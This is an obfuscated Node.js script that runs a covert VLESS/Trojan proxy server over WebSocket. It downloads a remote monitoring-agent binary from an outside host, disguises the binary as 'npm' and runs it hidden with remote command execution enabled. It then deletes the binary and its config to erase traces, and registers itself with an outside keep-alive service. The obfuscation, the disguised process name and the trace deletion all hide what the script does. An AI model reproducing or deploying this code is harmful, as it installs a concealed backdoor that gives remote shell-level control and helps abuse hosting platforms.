const _0x330d88=_0x3f89;(function(_0x376c2d,_0x5b7ebf){const _0x30f2bf=_0x3f89,_0x4f8355=_0x376c2d();while(!![]){try{const _0x6d6053=parseInt(_0x30f2bf(0xbe))/0x1+parseInt(_0x30f2bf(0x116))/0x2+-parseInt(_0x30f2bf(0xbf))/0x3*(-parseInt(_0x30f2bf(0xe0))/0x4)+-parseInt(_0x30f2bf(0xa5))/0x5+parseInt(_0x30f2bf(0xe2))/0x6*(-parseInt(_0x30f2bf(0xb3))/0x7)+-parseInt(_0x30f2bf(0xd2))/0x8*(parseInt(_0x30f2bf(0xca))/0x9)+parseInt(_0x30f2bf(0x11b))/0xa*(parseInt(_0x30f2bf(0xc7))/0xb);if(_0x6d6053===_0x5b7ebf)break;else _0x4f8355['push'](_0x4f8355['shift']());}catch(_0x469ce2){_0x4f8355['push'](_0x4f8355['shift']());}}}(_0x1f83,0x4ed07));const os=require('os'),http=require(_0x330d88(0x107)),fs=require('fs'),axios=require(_0x330d88(0xfb)),net=require(_0x330d88(0xb6)),path=require(_0x330d88(0xf3)),crypto=require(_0x330d88(0xf4)),{Buffer}=require(_0x330d88(0xd0)),{exec,execSync}=require(_0x330d88(0x103)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x330d88(0xf6)]||_0x330d88(0x115),NEZHA_SERVER=process['env'][_0x330d88(0x100)]||'',NEZHA_PORT=process[_0x330d88(0xb1)][_0x330d88(0xd4)]||'',NEZHA_KEY=process[_0x330d88(0xb1)][_0x330d88(0xff)]||'',DOMAIN=process[_0x330d88(0xb1)]['DOMAIN']||_0x330d88(0xe1),AUTO_ACCESS=process[_0x330d88(0xb1)][_0x330d88(0xdd)]||![],WSPATH=process[_0x330d88(0xb1)][_0x330d88(0xe4)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x330d88(0x11e)]||_0x330d88(0xaf),NAME=process[_0x330d88(0xb1)][_0x330d88(0xb4)]||'hugface',PORT=process[_0x330d88(0xb1)][_0x330d88(0xb9)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5abb81=_0x330d88;try{const _0x1259c6=await axios['get'](_0x5abb81(0xe8)),_0x3b2c1a=_0x1259c6[_0x5abb81(0xdc)];ISP=(_0x3b2c1a[_0x5abb81(0xa8)]+'-'+_0x3b2c1a[_0x5abb81(0x102)])[_0x5abb81(0x10f)](/ /g,'_');}catch(_0x26d0af){ISP=_0x5abb81(0xd7);}};function _0x3f89(_0x4d185d,_0x2eb917){_0x4d185d=_0x4d185d-0x9f;const _0x1f8381=_0x1f83();let _0x3f89a6=_0x1f8381[_0x4d185d];return _0x3f89a6;}GetISP();const httpServer=http[_0x330d88(0xf2)]((_0x500d78,_0x2b7fa1)=>{const _0x47b5c0=_0x330d88;if(_0x500d78['url']==='/'){const _0x5a3926=path[_0x47b5c0(0xf5)](__dirname,_0x47b5c0(0x111));fs[_0x47b5c0(0xf9)](_0x5a3926,_0x47b5c0(0xf1),(_0x172f17,_0x49448b)=>{const _0x15760e=_0x47b5c0;if(_0x172f17){_0x2b7fa1[_0x15760e(0x10a)](0xc8,{'Content-Type':_0x15760e(0xa7)}),_0x2b7fa1['end'](_0x15760e(0xdf));return;}_0x2b7fa1['writeHead'](0xc8,{'Content-Type':_0x15760e(0xa7)}),_0x2b7fa1[_0x15760e(0xc1)](_0x49448b);});return;}else{if(_0x500d78[_0x47b5c0(0x118)]==='/'+SUB_PATH){const _0x448395=NAME?NAME+'-'+ISP:ISP,_0x3635da=_0x47b5c0(0x10b)+UUID+_0x47b5c0(0xc6)+DOMAIN+_0x47b5c0(0xfd)+DOMAIN+_0x47b5c0(0xad)+WSPATH+'#'+_0x448395,_0x40c56d=_0x47b5c0(0xe7)+UUID+_0x47b5c0(0x10c)+DOMAIN+_0x47b5c0(0xfd)+DOMAIN+_0x47b5c0(0xad)+WSPATH+'#'+_0x448395,_0x40007e=_0x3635da+'\x0a'+_0x40c56d,_0x365993=Buffer[_0x47b5c0(0x114)](_0x40007e)[_0x47b5c0(0x120)](_0x47b5c0(0x122));_0x2b7fa1[_0x47b5c0(0x10a)](0xc8,{'Content-Type':_0x47b5c0(0xa1)}),_0x2b7fa1[_0x47b5c0(0xc1)](_0x365993+'\x0a');}else _0x2b7fa1[_0x47b5c0(0x10a)](0x194,{'Content-Type':'text/plain'}),_0x2b7fa1['end'](_0x47b5c0(0x124));}}),wss=new WebSocket[(_0x330d88(0xbd))]({'server':httpServer}),uuid=UUID[_0x330d88(0x10f)](/-/g,''),DNS_SERVERS=[_0x330d88(0xea),_0x330d88(0xc0)];function resolveHost(_0x279a0f){return new Promise((_0x8b7c13,_0x134e99)=>{const _0x1c0891=_0x3f89;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1c0891(0xd1)](_0x279a0f)){_0x8b7c13(_0x279a0f);return;}let _0x1cbd82=0x0;function _0x56f4cc(){const _0x406b61=_0x1c0891;if(_0x1cbd82>=DNS_SERVERS[_0x406b61(0x11c)]){_0x134e99(new Error(_0x406b61(0xba)+_0x279a0f+_0x406b61(0xc3)));return;}const _0x1a4482=DNS_SERVERS[_0x1cbd82];_0x1cbd82++;const _0x4d227f='https://dns.google/resolve?name='+encodeURIComponent(_0x279a0f)+_0x406b61(0xd9);axios[_0x406b61(0xeb)](_0x4d227f,{'timeout':0x1388,'headers':{'Accept':_0x406b61(0xe6)}})[_0x406b61(0x10e)](_0x5c535c=>{const _0x4f6e10=_0x406b61,_0x5bcb4d=_0x5c535c[_0x4f6e10(0xdc)];if(_0x5bcb4d[_0x4f6e10(0x11a)]===0x0&&_0x5bcb4d[_0x4f6e10(0xfc)]&&_0x5bcb4d[_0x4f6e10(0xfc)]['length']>0x0){const _0x462b37=_0x5bcb4d[_0x4f6e10(0xfc)]['find'](_0x2f31e=>_0x2f31e[_0x4f6e10(0xc5)]===0x1);if(_0x462b37){_0x8b7c13(_0x462b37['data']);return;}}_0x56f4cc();})['catch'](_0x338625=>{_0x56f4cc();});}_0x56f4cc();});}function handleVlessConnection(_0x5a5144,_0xfc71a5){const _0x4db666=_0x330d88,[_0x2db941]=_0xfc71a5,_0x47b09a=_0xfc71a5['slice'](0x1,0x11);if(!_0x47b09a[_0x4db666(0xa2)]((_0x5bf195,_0x320e64)=>_0x5bf195==parseInt(uuid[_0x4db666(0xf8)](_0x320e64*0x2,0x2),0x10)))return![];let _0x3057d5=_0xfc71a5['slice'](0x11,0x12)[_0x4db666(0xa0)]()+0x13;const _0x39b461=_0xfc71a5[_0x4db666(0xd6)](_0x3057d5,_0x3057d5+=0x2)[_0x4db666(0x123)](0x0),_0x60302e=_0xfc71a5[_0x4db666(0xd6)](_0x3057d5,_0x3057d5+=0x1)[_0x4db666(0xa0)](),_0x214e4e=_0x60302e==0x1?_0xfc71a5['slice'](_0x3057d5,_0x3057d5+=0x4)[_0x4db666(0xf5)]('.'):_0x60302e==0x2?new TextDecoder()['decode'](_0xfc71a5[_0x4db666(0xd6)](_0x3057d5+0x1,_0x3057d5+=0x1+_0xfc71a5['slice'](_0x3057d5,_0x3057d5+0x1)['readUInt8']())):_0x60302e==0x3?_0xfc71a5['slice'](_0x3057d5,_0x3057d5+=0x10)[_0x4db666(0xc8)]((_0x1a468e,_0x337e0b,_0x144969,_0x4af69f)=>_0x144969%0x2?_0x1a468e['concat'](_0x4af69f['slice'](_0x144969-0x1,_0x144969+0x1)):_0x1a468e,[])['map'](_0x5abdf4=>_0x5abdf4[_0x4db666(0x123)](0x0)[_0x4db666(0x120)](0x10))[_0x4db666(0xf5)](':'):'';_0x5a5144['send'](new Uint8Array([_0x2db941,0x0]));const _0x13fa42=createWebSocketStream(_0x5a5144);return resolveHost(_0x214e4e)[_0x4db666(0x10e)](_0x516af3=>{const _0x5aa9d7=_0x4db666;net['connect']({'host':_0x516af3,'port':_0x39b461},function(){const _0x4b6be3=_0x3f89;this[_0x4b6be3(0xc4)](_0xfc71a5[_0x4b6be3(0xd6)](_0x3057d5)),_0x13fa42['on'](_0x4b6be3(0x11d),()=>{})[_0x4b6be3(0xbc)](this)['on'](_0x4b6be3(0x11d),()=>{})[_0x4b6be3(0xbc)](_0x13fa42);})['on'](_0x5aa9d7(0x11d),()=>{});})[_0x4db666(0xd5)](_0x4ac600=>{const _0x3b958b=_0x4db666;net[_0x3b958b(0x11f)]({'host':_0x214e4e,'port':_0x39b461},function(){const _0x2c4757=_0x3b958b;this[_0x2c4757(0xc4)](_0xfc71a5['slice'](_0x3057d5)),_0x13fa42['on'](_0x2c4757(0x11d),()=>{})[_0x2c4757(0xbc)](this)['on'](_0x2c4757(0x11d),()=>{})[_0x2c4757(0xbc)](_0x13fa42);})['on'](_0x3b958b(0x11d),()=>{});}),!![];}function _0x1f83(){const _0xa8ee01=['11170150qOFAHh','length','error','SUB_PATH','connect','toString','Server\x20is\x20running\x20on\x20port\x20','base64','readUInt16BE','Not\x20Found\x0a','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','unlink','readUInt8','text/plain','every','message','update','1389275AkJsVY','2096','text/html','country','\x20-p\x20','443','https://amd64.ssss.nyc.mn/v1','npm','&path=%2F','listen','sub','close','env','2083','35hBSiKv','NAME','client_secret:\x20','net','error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','PORT','Failed\x20to\x20resolve\x20','post','pipe','Server','73980bEQozR','327189iXhulo','1.1.1.1','end','config.yaml','\x20with\x20all\x20DNS\x20servers','write','type','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','11TecFmL','reduce','createWriteStream','8217kFYkem','trim','2087','https://arm64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','utf-8','buffer','test','4928pBsrKo','stream','NEZHA_PORT','catch','slice','Unknown','false','&type=A','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','chmod\x20+x\x20npm','data','AUTO_ACCESS','8443','Hello\x20world!','4FEeesd','a.9.3.0.d.1.f.1.0.7.4.0.1.0.0.2.ip6.arpa','634182vjnapR','arch','WSPATH','createHash','application/dns-json','trojan://','https://speed.cloudflare.com/meta','pop','8.8.4.4','get','arm64','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm\x20is\x20running','finish','true','utf8','createServer','path','crypto','join','UUID','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','substr','readFile','hex','axios','Answer','&fp=chrome&type=ws&host=','--tls','NEZHA_KEY','NEZHA_SERVER','includes','asOrganization','child_process','npm\x20download\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/agent','http','npm\x20running\x20error:','sha224','writeHead','vless://','@cdns.doon.eu.org:443?security=tls&sni=','log','then','replace','https://arm64.ssss.nyc.mn/v1','index.html','concat','aarch64','from','718bedd0-984d-418a-adfc-d40345b89cde','783026IRPWyW','setsid\x20nohup\x20./npm\x20-s\x20','url','https://','Status'];_0x1f83=function(){return _0xa8ee01;};return _0x1f83();}function handleTrojanConnection(_0x4b0cb1,_0x214f80){const _0x22170f=_0x330d88;try{if(_0x214f80[_0x22170f(0x11c)]<0x3a)return![];const _0x5bdf91=_0x214f80[_0x22170f(0xd6)](0x0,0x38)[_0x22170f(0x120)](),_0x56a472=[UUID];let _0x81e1f7=null;for(const _0x4b59f7 of _0x56a472){const _0x2dcb5e=crypto[_0x22170f(0xe5)](_0x22170f(0x109))[_0x22170f(0xa4)](_0x4b59f7)['digest'](_0x22170f(0xfa));if(_0x2dcb5e===_0x5bdf91){_0x81e1f7=_0x4b59f7;break;}}if(!_0x81e1f7)return![];let _0x25a5ba=0x38;_0x214f80[_0x25a5ba]===0xd&&_0x214f80[_0x25a5ba+0x1]===0xa&&(_0x25a5ba+=0x2);const _0x22ea22=_0x214f80[_0x25a5ba];if(_0x22ea22!==0x1)return![];_0x25a5ba+=0x1;const _0x238c87=_0x214f80[_0x25a5ba];_0x25a5ba+=0x1;let _0x2a8c5f,_0x68f693;if(_0x238c87===0x1)_0x2a8c5f=_0x214f80[_0x22170f(0xd6)](_0x25a5ba,_0x25a5ba+0x4)['join']('.'),_0x25a5ba+=0x4;else{if(_0x238c87===0x3){const _0x311745=_0x214f80[_0x25a5ba];_0x25a5ba+=0x1,_0x2a8c5f=_0x214f80['slice'](_0x25a5ba,_0x25a5ba+_0x311745)[_0x22170f(0x120)](),_0x25a5ba+=_0x311745;}else{if(_0x238c87===0x4)_0x2a8c5f=_0x214f80[_0x22170f(0xd6)](_0x25a5ba,_0x25a5ba+0x10)[_0x22170f(0xc8)]((_0x27b99d,_0x5dfb01,_0x48be16,_0x32bd6d)=>_0x48be16%0x2?_0x27b99d[_0x22170f(0x112)](_0x32bd6d[_0x22170f(0xd6)](_0x48be16-0x1,_0x48be16+0x1)):_0x27b99d,[])['map'](_0x141079=>_0x141079[_0x22170f(0x123)](0x0)[_0x22170f(0x120)](0x10))['join'](':'),_0x25a5ba+=0x10;else return![];}}_0x68f693=_0x214f80[_0x22170f(0x123)](_0x25a5ba),_0x25a5ba+=0x2;_0x25a5ba<_0x214f80[_0x22170f(0x11c)]&&_0x214f80[_0x25a5ba]===0xd&&_0x214f80[_0x25a5ba+0x1]===0xa&&(_0x25a5ba+=0x2);const _0xee04fe=createWebSocketStream(_0x4b0cb1);return resolveHost(_0x2a8c5f)[_0x22170f(0x10e)](_0x8b3180=>{const _0x42c29a=_0x22170f;net[_0x42c29a(0x11f)]({'host':_0x8b3180,'port':_0x68f693},function(){const _0x1a3215=_0x42c29a;_0x25a5ba<_0x214f80[_0x1a3215(0x11c)]&&this[_0x1a3215(0xc4)](_0x214f80[_0x1a3215(0xd6)](_0x25a5ba)),_0xee04fe['on'](_0x1a3215(0x11d),()=>{})[_0x1a3215(0xbc)](this)['on']('error',()=>{})['pipe'](_0xee04fe);})['on']('error',()=>{});})['catch'](_0x4e486b=>{const _0x299558=_0x22170f;net[_0x299558(0x11f)]({'host':_0x2a8c5f,'port':_0x68f693},function(){const _0x42bd8b=_0x299558;_0x25a5ba<_0x214f80[_0x42bd8b(0x11c)]&&this['write'](_0x214f80[_0x42bd8b(0xd6)](_0x25a5ba)),_0xee04fe['on'](_0x42bd8b(0x11d),()=>{})[_0x42bd8b(0xbc)](this)['on'](_0x42bd8b(0x11d),()=>{})[_0x42bd8b(0xbc)](_0xee04fe);})['on'](_0x299558(0x11d),()=>{});}),!![];}catch(_0x5e8d4f){return![];}}wss['on']('connection',(_0x1538e5,_0x17743e)=>{const _0x1bbca1=_0x330d88,_0x47454f=_0x17743e[_0x1bbca1(0x118)]||'';_0x1538e5['once'](_0x1bbca1(0xa3),_0x50b77e=>{const _0x25876a=_0x1bbca1;if(_0x50b77e['length']>0x11&&_0x50b77e[0x0]===0x0){const _0xdecb9d=_0x50b77e[_0x25876a(0xd6)](0x1,0x11),_0x3d9582=_0xdecb9d[_0x25876a(0xa2)]((_0x37ef66,_0x328454)=>_0x37ef66==parseInt(uuid[_0x25876a(0xf8)](_0x328454*0x2,0x2),0x10));if(_0x3d9582){!handleVlessConnection(_0x1538e5,_0x50b77e)&&_0x1538e5[_0x25876a(0xb0)]();return;}}!handleTrojanConnection(_0x1538e5,_0x50b77e)&&_0x1538e5[_0x25876a(0xb0)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x158aad=_0x330d88,_0xaf298f=os[_0x158aad(0xe3)]();return _0xaf298f==='arm'||_0xaf298f===_0x158aad(0xec)||_0xaf298f===_0x158aad(0x113)?!NEZHA_PORT?_0x158aad(0x110):_0x158aad(0xcd):!NEZHA_PORT?_0x158aad(0xab):_0x158aad(0x106);},downloadFile=async()=>{const _0x21c466=_0x330d88;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2098d8=getDownloadUrl(),_0x57fec1=await axios({'method':_0x21c466(0xeb),'url':_0x2098d8,'responseType':_0x21c466(0xd3)}),_0xb506ec=fs[_0x21c466(0xc9)](_0x21c466(0xac));return _0x57fec1[_0x21c466(0xdc)]['pipe'](_0xb506ec),new Promise((_0xb8138b,_0x50e7e3)=>{const _0x27c45d=_0x21c466;_0xb506ec['on'](_0x27c45d(0xef),()=>{const _0xbe0ded=_0x27c45d;console[_0xbe0ded(0x10d)](_0xbe0ded(0x104)),exec(_0xbe0ded(0xdb),_0x5279b8=>{if(_0x5279b8)_0x50e7e3(_0x5279b8);_0xb8138b();});}),_0xb506ec['on'](_0x27c45d(0x11d),_0x50e7e3);});}catch(_0x5e9ddd){throw _0x5e9ddd;}},runnz=async()=>{const _0x2d89e3=_0x330d88;try{const _0x1b4387=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2d89e3(0xcf)});if(_0x1b4387[_0x2d89e3(0xcb)]()!==''){console[_0x2d89e3(0x10d)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3e217a){}await downloadFile();let _0x1206a6='',_0x374c8b=[_0x2d89e3(0xaa),_0x2d89e3(0xde),_0x2d89e3(0xa6),_0x2d89e3(0xcc),_0x2d89e3(0xb2),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x373364=_0x374c8b[_0x2d89e3(0x101)](NEZHA_PORT)?_0x2d89e3(0xfe):'';_0x1206a6=_0x2d89e3(0x117)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2d89e3(0xa9)+NEZHA_KEY+'\x20'+_0x373364+_0x2d89e3(0xda);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x365146=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x2d89e3(0xe9)]():'',_0x362994=_0x374c8b[_0x2d89e3(0x101)](_0x365146)?_0x2d89e3(0xf0):_0x2d89e3(0xd8),_0x5c639b=_0x2d89e3(0xb5)+NEZHA_KEY+_0x2d89e3(0x105)+NEZHA_SERVER+_0x2d89e3(0x125)+_0x362994+_0x2d89e3(0xb8)+UUID;fs['writeFileSync'](_0x2d89e3(0xc2),_0x5c639b);}_0x1206a6=_0x2d89e3(0xf7);}else{console[_0x2d89e3(0x10d)](_0x2d89e3(0xed));return;}}try{exec(_0x1206a6,{'shell':'/bin/bash'},_0xa308c3=>{const _0x47bd49=_0x2d89e3;if(_0xa308c3)console[_0x47bd49(0x11d)](_0x47bd49(0x108),_0xa308c3);else console['log'](_0x47bd49(0xee));});}catch(_0x5a49ba){console[_0x2d89e3(0x11d)](_0x2d89e3(0xb7)+_0x5a49ba);}};async function addAccessTask(){const _0x17cab2=_0x330d88;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1401e9=_0x17cab2(0x119)+DOMAIN+'/'+SUB_PATH;try{const _0x2c3f46=await axios[_0x17cab2(0xbb)](_0x17cab2(0xce),{'url':_0x1401e9},{'headers':{'Content-Type':'application/json'}});console[_0x17cab2(0x10d)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4d7c7c){}}const delFiles=()=>{const _0x174d6a=_0x330d88;fs['unlink'](_0x174d6a(0xac),()=>{}),fs[_0x174d6a(0x9f)](_0x174d6a(0xc2),()=>{});};httpServer[_0x330d88(0xae)](PORT,()=>{const _0x29fef5=_0x330d88;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x29fef5(0x10d)](_0x29fef5(0x121)+PORT);});
